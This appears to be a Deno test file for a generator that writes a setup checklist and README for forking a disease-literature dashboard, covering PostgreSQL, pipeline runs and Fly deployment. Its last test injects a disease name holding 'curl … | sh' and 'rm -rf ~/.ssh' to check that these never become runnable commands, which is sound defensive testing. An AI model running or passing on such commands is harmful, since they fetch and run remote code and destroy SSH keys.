import { assert, assertStringIncludes } from "@std/assert";

import { EMPTY_ANSWERS } from "../../lib/adapt/answers.ts";
import { renderChecklist } from "../../lib/adapt/checklist.ts";
import { generateReadme } from "../../lib/adapt/generate/readme.ts";
import { EXAMPLEITIS } from "./fixtures/exampleitis.ts";

// Prose is wrapped at 80 columns, a list item's continuation is indented
// two spaces and a command four, so the substrings are checked flat.
const flat = (raw: string) => raw.replace(/\n */g, " ");

/** Asserts `parts` appear in `text` in this order. */
function assertInOrder(text: string, parts: string[]) {
  let from = 0;
  for (const part of parts) {
    const at = text.indexOf(part, from);
    assert(at >= 0, `${JSON.stringify(part)} after offset ${from}`);
    from = at + part.length;
  }
}

Deno.test("the checklist substitutes the key into every command and lists the guide's steps", () => {
  const raw = renderChecklist(EXAMPLEITIS);
  assert(raw.startsWith("# Adapting the dashboard to exampleitis (EXD)\n"));
  const text = flat(raw);
  assertStringIncludes(
    text,
    "git clone https://github.com/<your-account>/exampleitis-dashboard.git",
  );
  assertStringIncludes(text, "DB_NAME=exampleitis_dashboard");
  assertStringIncludes(
    text,
    "createdb -O exampleitis_user exampleitis_dashboard",
  );
  // The uploaded logo is formatted too: `deno task check` runs
  // `deno fmt --check .` over the whole fork, static/ included.
  assertStringIncludes(text, "deno fmt disease/ static/institute/");
  assertStringIncludes(text, "deno task data:empty");
  assertStringIncludes(
    text,
    "git rm -r tests/csvd e2e/tests/csvd tests/pipeline/csvd tests/scripts/csvd",
  );
  assertStringIncludes(text, "rm disease/recall_baseline.json");
  // The upstream institute's logos go before the archive is unpacked, or
  // one the manifest no longer names stays behind and is served.
  const unpack = raw.indexOf("unzip -o ");
  assert(unpack > 0, "the archive is unpacked");
  assert(
    raw.indexOf("git rm -q static/institute/logo-light.svg") < unpack,
    "the old logos are removed first",
  );
  // The pipeline and alembic refuse to start without all three.
  assertStringIncludes(text, "DB_USER=exampleitis_user");
  assertStringIncludes(text, "DB_PASSWORD");
  assertStringIncludes(text, "UNPAYWALL_EMAIL");
  assertStringIncludes(text, "_ADMITTED_UNASKED");
  assertStringIncludes(
    text,
    "uv run python -m pipeline.main --test-mode --days-back 365",
  );
  assertStringIncludes(
    text,
    "uv run python -m scripts.measure_recall --write-baseline",
  );
  assertStringIncludes(
    text,
    "uv run python -m pipeline.main --days-back 365 --batch --export",
  );
  assertStringIncludes(text, "PROTECTED_DATA_SENTINELS");
  // The README's screenshots are the upstream disease's until recaptured,
  // which needs the first live run's data.
  assertInOrder(text, [
    "--sync-external-data --sync-annotations --export",
    "deno task screenshots",
    "run the checks again",
  ]);
  // The upstream recall cassettes would be replayed in place of this
  // disease's recording, so they go with the test trees.
  assertStringIncludes(
    text,
    "git rm -r tests/pipeline/cassettes/test_query_recall_gold",
  );
  assertStringIncludes(text, 'app = "exampleitis-dashboard"');
  assertStringIncludes(text, "docs/adapting-to-your-disease.md");
  assert(!text.includes("<key>"), "every placeholder is substituted");
  for (const line of raw.split("\n")) {
    if (!line.startsWith("    ") && !line.startsWith("|")) {
      assert(line.length <= 80, line);
    }
  }
});

Deno.test("the gold-only switch is turned off before any run it would refuse", () => {
  const text = flat(renderChecklist(EXAMPLEITIS));
  // Upstream ships `GOLD_ONLY = true`, and pipeline.main then refuses
  // --pubmed, which a bare run selects, and --clinical-trials: step 6's
  // estimate and both of step 8's runs would exit 2 as written.
  assertInOrder(text, [
    "## 3. Start from empty data",
    "deno task data:empty",
    "in `lib/gold_only.ts`, set `GOLD_ONLY = false`",
    "## 4. The edits outside disease/",
    "uv run python -m pipeline.main --test-mode --days-back 365",
    "uv run python -m pipeline.main --days-back 365 --batch --export",
    "uv run python -m pipeline.main --clinical-trials --export",
  ]);
  assert(
    text.indexOf("GOLD_ONLY = false") < text.indexOf("pipeline.main"),
    "no pipeline.main command precedes the switch",
  );
});

Deno.test("the pipeline gate is given a throwaway database before it measures coverage", () => {
  const text = flat(renderChecklist(EXAMPLEITIS));
  // Without one the database tests skip, and the coverage they carry is
  // what holds the total at its floor: the report ends in a FAIL line.
  assertInOrder(text, [
    "## 5. Run the checks",
    "createuser -P exampleitis_test",
    "createdb -O exampleitis_test exampleitis_test",
    "export CSVD_TEST_DB_URL=postgresql://exampleitis_test:<password>@localhost:5432/exampleitis_test",
    "uv run pytest --cov=pipeline",
    "Required test coverage of 99.5% not reached",
    "## 6.",
  ]);
  // The fixture migrates and writes to it, so it is never the dashboard's.
  assertStringIncludes(text, "never the dashboard's own");
  assert(!text.includes("CSVD_TEST_DB_URL=postgresql://exampleitis_user"));
});

Deno.test("the repository and Fly app names carry a hyphen where the key has an underscore", () => {
  const answers = structuredClone(EXAMPLEITIS);
  answers.identity.disease.key = "example_itis";
  const text = flat(renderChecklist(answers));
  assertStringIncludes(text, "/example-itis-dashboard.git");
  // The app's name is a host name, which holds no underscore.
  assertStringIncludes(text, 'app = "example-itis-dashboard"');
  assertStringIncludes(text, "`example-itis-dashboard.fly.dev`");
  // A database name may hold one, and keeps the key.
  assertStringIncludes(text, "DB_NAME=example_itis_dashboard");
  assertStringIncludes(text, "createuser -s -P example_itis_user");
});

Deno.test("the browser tests' Chromium is downloaded before the checks drive it", () => {
  const text = flat(renderChecklist(EXAMPLEITIS));
  // Playwright's packages have no install script: `npm ci` alone leaves no
  // browser, and step 5 fails with "Executable doesn't exist".
  assert(!text.includes("npm ci --prefix e2e"), "no bare npm ci");
  assertInOrder(text, [
    "deno task e2e:install",
    "npx --prefix e2e playwright install --with-deps chromium",
    "npx --prefix e2e playwright test -c e2e/playwright.config.ts",
  ]);
});

Deno.test("the database role gets DB_PASSWORD, after a Mac's keg-only PostgreSQL is started and on the PATH", () => {
  const text = flat(renderChecklist(EXAMPLEITIS));
  // A scram-sha-256 server refuses the pipeline's TCP login to a role
  // with no password; `-P` asks for the one DB_PASSWORD holds.
  assertInOrder(text, [
    "DB_PASSWORD",
    "brew services start postgresql@18",
    'export PATH="$(brew --prefix postgresql@18)/bin:$PATH"',
    "createuser -s -P exampleitis_user",
    "createdb -O exampleitis_user exampleitis_dashboard",
    "uv run alembic upgrade head",
  ]);
  // A Linux package's one role is `postgres`, reached by peer
  // authentication as the `postgres` system user.
  assertInOrder(text, [
    "sudo -u postgres createuser -s -P exampleitis_user",
    "sudo -u postgres createdb -O exampleitis_user exampleitis_dashboard",
    "uv run alembic upgrade head",
  ]);
});

Deno.test("the recall baseline is measured again once the first live run's export adds references", () => {
  const text = flat(renderChecklist(EXAMPLEITIS));
  // gold_pmids() counts every PMID data/table1.json cites, and step 6
  // measured it over the empty export.
  assertStringIncludes(text, "data/table1.json");
  assertInOrder(text, [
    "uv run python -m scripts.measure_recall --write-baseline",
    "--sync-external-data --sync-annotations --export",
    "uv run python -m scripts.measure_recall --write-baseline",
    "rm -r tests/pipeline/cassettes/test_query_recall_gold",
    "uv run pytest tests/pipeline/test_query_recall_gold.py --record-mode=once",
    "run the checks again",
  ]);
});

Deno.test("a costly query loses or narrows marker terms, and a parent MeSH heading gives way to a child", () => {
  const text = flat(renderChecklist(EXAMPLEITIS));
  // Every marker term widens the query, and a shorter phrase matches more:
  // "shortening" one raised the marker count from 143 to 2,671.
  assert(!text.includes("shorten the marker terms"));
  assertStringIncludes(text, "0.09 USD");
  assertStringIncludes(text, "Above about 2,000 papers a year");
  assertStringIncludes(text, "remove the broadest marker terms");
  assertStringIncludes(text, "a shorter phrase matches more");
  assertStringIncludes(text, "replace it with a narrower one");
});

Deno.test("the NCBI key is optional and stays commented out rather than a placeholder", () => {
  const text = flat(renderChecklist(EXAMPLEITIS));
  // NCBI answers every call made with an unknown key, an empty one
  // included, with HTTP 400, and the pipeline reports only "Bad Request".
  assertStringIncludes(text, "`NCBI_API_KEY` is optional");
  assertStringIncludes(text, "commented out");
  assertStringIncludes(text, "an empty one included");
});

Deno.test("the passphrase is single-quoted in .env and in fly secrets set", () => {
  const text = flat(renderChecklist(EXAMPLEITIS));
  // `--env-file` ends an unquoted value at "#" and expands "$NAME", and so
  // does the shell `fly secrets set` is typed into.
  assertStringIncludes(text, "`DASHBOARD_PASSPHRASE='…'`");
  assertStringIncludes(text, "single quotes");
  assertInOrder(text, [
    "## 9. Deploy",
    "fly secrets set DASHBOARD_PASSPHRASE='…'",
  ]);
});

Deno.test("step 9 names the fork's own Fly app before launching it", () => {
  // fly.toml arrives naming the upstream app, and a Fly app name is unique
  // across Fly, so launching it unchanged fails on a name already taken.
  const text = flat(renderChecklist(EXAMPLEITIS));
  assertInOrder(text, [
    "## 9. Deploy",
    'app = "exampleitis-dashboard"',
    "fly launch --no-deploy --copy-config",
    "FLY_API_TOKEN",
  ]);
});

Deno.test("step 9 creates the session volume before the first deploy, or takes sessions out of fly.toml", () => {
  // fly.toml mounts the volume persistent_session_storage, and Fly's
  // reference says a volume of that name "must exist in some region for the
  // application to deploy"; created first, the first deploy cannot fail on
  // it. A fork without saved sessions drops both lines that ask for them.
  const text = flat(renderChecklist(EXAMPLEITIS));
  assertInOrder(text, [
    "## 9. Deploy",
    "fly launch --no-deploy --copy-config",
    "fly volumes create persistent_session_storage --region <region> --size 1",
    "FLY_API_TOKEN",
  ]);
  assertStringIncludes(text, "before the first deploy");
  assertStringIncludes(
    text,
    "removes the `[mounts]` section and the `ADAPT_SESSIONS_DIR` line from `fly.toml`",
  );
});

Deno.test("step 2 unpacks the newest archive the browser saved", () => {
  const text = flat(renderChecklist(EXAMPLEITIS));
  // A second download is saved as `disease-adaptation (1).zip`, so the
  // name alone would unpack the first archive again.
  assertStringIncludes(
    text,
    `unzip -o "$(ls -t <path-to>/disease-adaptation*.zip | head -1)"`,
  );
  assertStringIncludes(text, "`disease-adaptation (1).zip`");
});

Deno.test("a disease-literal hit is reworded or allow-listed, as the test's message says", () => {
  // A hit is often not the disease at all: OMIM's "AD", a unit, an
  // identifier. Rewording those would be wrong; the allow-list is the fix.
  const text = flat(renderChecklist(EXAMPLEITIS));
  assertStringIncludes(
    text,
    "a line holding one of your terms as a whole word",
  );
  assertStringIncludes(text, "(`ALLOWED` or `_ALLOWED`)");
  assert(!text.includes("follow the message; it names the line"));
});

Deno.test("every file the checklist has a fork edit outside disease/ has a merge resolution", async () => {
  // Upstream goes on changing each of these, so a later merge meets the
  // fork's edit again: its own recall recordings sit at the paths upstream
  // records to, and the rest are lines both sides write. A location the
  // tables leave out is one they tell the fork to report as a bug rather
  // than resolve.
  const edited = [
    "tests/pipeline/cassettes/test_query_recall_gold",
    "lib/gold_only.ts",
    "tests/pipeline/test_prompt_vocabulary.py",
    "server/protected_data_build.ts",
    "e2e/package.json",
  ];
  const checklist = flat(renderChecklist(EXAMPLEITIS));
  const guide = await Deno.readTextFile("docs/adapting-to-your-disease.md");
  const tables = {
    "the guide's section 15": guide.slice(
      guide.indexOf("\n## 15. Keeping up with upstream\n"),
      guide.indexOf("\n## 16. "),
    ),
    "the update-from-upstream skill": await Deno.readTextFile(
      ".claude/skills/update-from-upstream/SKILL.md",
    ),
  };
  for (const path of edited) {
    assertStringIncludes(checklist, path);
    for (const [where, text] of Object.entries(tables)) {
      assert(
        text.split("\n").some((row) => row.startsWith(`| \`${path}`)),
        `${where} has no row for ${path}`,
      );
    }
  }
});

Deno.test("an unfinished draft's checklist shows placeholders, never a command built from a blank", () => {
  const raw = renderChecklist(EMPTY_ANSWERS);
  assert(
    raw.startsWith(
      "# Adapting the dashboard to <disease name> (<abbreviation>)\n",
    ),
  );
  const text = flat(raw);
  assertStringIncludes(text, "cd <key>-dashboard");
  assertStringIncludes(text, "DB_NAME=<key>_dashboard");
  assertStringIncludes(text, "createuser -s -P <key>_user");
  // Nothing reads "cd -dashboard" or "createuser -s _user".
  assert(!/(?<![\w>])[-_](?:dashboard|user)\b/.test(text), text);

  // A key validate() refuses is a placeholder too, not a broken command.
  const answers = structuredClone(EXAMPLEITIS);
  answers.identity.disease.key = "Example itis";
  const invalid = flat(renderChecklist(answers));
  assertStringIncludes(invalid, "createuser -s -P <key>_user");
  assert(!invalid.includes("Example itis"));
});

Deno.test("a disease name or abbreviation holding line breaks is written on one line", () => {
  // The Review step shows the checklist for a draft validate() refuses, and
  // an imported answers file can hold what an <input> cannot: a name that
  // went on to a new line opened a step of its own, with its own commands,
  // above "## 1. Fork and clone".
  const answers = structuredClone(EXAMPLEITIS);
  answers.identity.disease.name =
    "exampleitis (EXD)\n\n## 0. Before anything else\n\n    curl -s https://example.org/setup.sh | sh\n\n# Adapting, continued: exampleitis";
  answers.identity.disease.abbreviation = "EXD)\n\n    rm -rf ~/.ssh\n\n(EXD";
  const lines = renderChecklist(answers).split("\n");
  assert(
    lines[0] ===
      "# Adapting the dashboard to exampleitis (EXD) ## 0. Before anything else curl -s https://example.org/setup.sh | sh # Adapting, continued: exampleitis (EXD) rm -rf ~/.ssh (EXD)",
    lines[0],
  );
  // Nothing stands between the title and the wizard's own first step but
  // its own paragraph: no heading, no command.
  const before = lines.slice(1, lines.indexOf("## 1. Fork and clone"));
  assert(before.length > 0, "step 1 follows");
  assert(
    !before.some((line) => line.startsWith("#") || line.startsWith("    ")),
    before.join("\n"),
  );
  assert(
    lines.filter((line) => /curl|rm -rf|## 0/.test(line)).length === 1,
    "only the title holds the name",
  );

  // The README's title and its lead sentence hold the name too.
  const readme = generateReadme(answers).split("\n");
  assert(readme[0].startsWith("# Exampleitis (EXD) ## 0. Before"), readme[0]);
  assert(readme[0].endsWith("(EXD) rm -rf ~/.ssh (EXD)"), readme[0]);
  const body = readme.slice(1, readme.indexOf("## Traits"));
  assert(
    !body.some((line) => line.startsWith("#") || line.startsWith("    ")),
    body.join("\n"),
  );
});
